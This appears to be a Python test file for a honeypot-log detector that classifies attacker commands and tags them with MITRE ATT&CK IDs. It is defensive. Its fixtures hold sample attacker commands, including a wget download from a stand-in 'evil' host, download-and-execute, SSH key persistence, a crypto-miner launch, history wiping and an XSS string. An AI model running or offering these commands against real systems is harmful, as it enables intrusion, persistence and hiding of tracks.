import json
import os
import tempfile
import threading
import unittest
import urllib.request
from datetime import datetime

import utils.i18n as i18n
from detector.dashboard import create_server
from detector.honeypot import TECHNIQUE_NAMES, classify, techniques, load_cowrie, summarize_honeypot

i18n.set_lang("en")
XSS = "<script>alert(1)</script>"


def _events():
    now = datetime.utcnow().isoformat() + "Z"
    base = {"src_ip": "5.6.7.8", "timestamp": now}
    return [
        dict(base, eventid="cowrie.session.connect"),
        dict(base, eventid="cowrie.client.version", version="SSH-2.0-libssh"),
        dict(base, eventid="cowrie.login.failed", username="root", password="123456"),
        dict(base, eventid="cowrie.login.failed", username="admin", password="123456"),
        dict(base, eventid="cowrie.login.success", username="root", password=XSS),
        dict(base, eventid="cowrie.command.input", input="uname -a"),
        dict(base, eventid="cowrie.command.input", input="wget http://evil/x.sh"),
        dict(base, eventid="cowrie.session.file_download", url="http://evil/x.sh", shasum="a" * 64),
    ]


class TestHoneypot(unittest.TestCase):
    def setUp(self):
        fd, self.path = tempfile.mkstemp(suffix=".json")
        os.close(fd)
        self.addCleanup(os.remove, self.path)
        with open(self.path, "w", encoding="utf-8") as fh:
            for e in _events():
                fh.write(json.dumps(e) + "\n")
            fh.write("not json\n")

    def summary(self):
        return summarize_honeypot(load_cowrie([self.path]), None, datetime.utcnow())

    def test_totals_and_rankings(self):
        s = self.summary()
        self.assertEqual(s["totals"], {"sessions": 1, "attempts": 3, "unique_ips": 1,
                                       "shell_logins": 1, "commands": 2, "downloads": 1})
        self.assertEqual(s["passwords"][0], ["123456", 2])
        self.assertEqual(s["shell_ips"], ["5.6.7.8"])
        self.assertEqual(s["recent_commands"][0]["command"], "wget http://evil/x.sh")

    def test_classify(self):
        self.assertEqual(classify("uname -a"), ["recon"])
        self.assertIn("ssh_key", classify('echo "ssh-rsa AAAA" >> ~/.ssh/authorized_keys'))
        self.assertIn("miner", classify("./xmrig -o stratum+tcp://pool"))
        self.assertIn("download_exec", classify("wget http://x/y.sh; chmod +x y.sh"))
        self.assertIn("cleanup", classify("rm -rf /tmp/y.sh; history -c"))
        self.assertEqual(classify("echo hello"), [])

    def test_behaviours_and_hashes(self):
        s = self.summary()
        self.assertIn(["recon", 1], s["behaviours"])
        self.assertIn(["download_exec", 1], s["behaviours"])
        self.assertEqual(s["hashes"], [["a" * 64, 1]])
        self.assertEqual(s["recent_commands"][0]["tags"], ["download_exec"])

    def test_whitelist_excluded_and_empty_labels(self):
        from utils.ip_utils import parse_cidr_list
        self.assertEqual(load_cowrie([self.path], exclude_nets=parse_cidr_list(["5.6.7.0/24"])), [])
        rec = dict(_events()[2], password="")
        with open(self.path, "w", encoding="utf-8") as fh:
            fh.write(json.dumps(rec) + "\n")
            fh.write(json.dumps(dict(_events()[-1], url="", shasum="b" * 64)) + "\n")
        s = self.summary()
        self.assertEqual(s["passwords"][0][0], "(empty)")
        self.assertEqual(s["downloads"][0][0], "(written in shell) " + "b" * 12)

    def test_rankings_count_distinct_ips_and_campaigns(self):
        now = datetime.utcnow().isoformat() + "Z"
        key = 'echo "ssh-rsa AAAA" >> ~/.ssh/authorized_keys'
        evs = [dict(eventid="cowrie.command.input", src_ip=ip, timestamp=now, input=cmd)
               for ip, cmd in [("1.1.1.1", "uname -a")] * 5 + [("1.1.1.1", key), ("2.2.2.2", key)]]
        with open(self.path, "w", encoding="utf-8") as fh:
            for e in evs:
                fh.write(json.dumps(e) + "\n")
        s = self.summary()
        self.assertIn(["uname -a", 1], s["commands"])
        self.assertIn(["recon", 1], s["behaviours"])
        self.assertEqual(s["behaviours"][0][1], 2)
        camp = s["campaigns"][0]
        self.assertEqual((camp["ips"], camp["runs"]), (2, 2))
        self.assertIn("T1098.004", camp["mitre"])
        self.assertEqual([c["command"] for c in s["campaigns"]], [key])
        self.assertEqual(s["techniques"][0][0], "T1098.004")

    def test_techniques_match_official_ids(self):
        self.assertEqual(techniques("uname -s -v -n -r -m"), ["T1082"])
        self.assertEqual(techniques("whoami"), ["T1033"])
        self.assertEqual(techniques("history -c"), ["T1070.003"])
        self.assertEqual(techniques("rm -rf /tmp/x"), ["T1070.004"])
        self.assertEqual(techniques("cd ~; chattr -ia .ssh"), ["T1222.002"])
        self.assertEqual(techniques("cat /etc/passwd"), ["T1087.001"])
        self.assertEqual(techniques("echo hello"), [])
        self.assertIn("T1098.004", techniques('echo "ssh-rsa AAAA" >> .ssh/authorized_keys'))
        self.assertTrue(all(n for n in TECHNIQUE_NAMES.values()))

    def test_chattr_is_permission_change(self):
        self.assertIn("perm_mod", classify("chattr -ia .ssh"))

    def test_missing_file_is_ignored(self):
        self.assertEqual(load_cowrie(["/nonexistent/cowrie.json"]), [])

    def test_long_text_is_clipped(self):
        rec = _events()[2]
        rec["password"] = "a" * 500
        with open(self.path, "w", encoding="utf-8") as fh:
            fh.write(json.dumps(rec) + "\n")
        self.assertLessEqual(len(self.summary()["passwords"][0][0]), 120)

    def test_dashboard_panel_escapes_and_api(self):
        fd, alerts = tempfile.mkstemp(suffix=".jsonl")
        os.close(fd)
        self.addCleanup(os.remove, alerts)
        server = create_server(alerts, "127.0.0.1", 0, honeypot_paths=[self.path])
        t = threading.Thread(target=server.serve_forever, daemon=True)
        t.start()
        self.addCleanup(t.join, 5)
        self.addCleanup(server.server_close)
        self.addCleanup(server.shutdown)
        base = f"http://127.0.0.1:{server.server_address[1]}"
        with urllib.request.urlopen(base + "/", timeout=5) as r:
            body = r.read().decode()
        self.assertIn("Honeypot (Cowrie)", body)
        self.assertNotIn(XSS, body)
        self.assertIn("&lt;script&gt;", body)
        with urllib.request.urlopen(base + "/api/summary?since=all", timeout=5) as r:
            self.assertEqual(json.loads(r.read())["honeypot"]["totals"]["attempts"], 3)


if __name__ == "__main__":
    unittest.main()
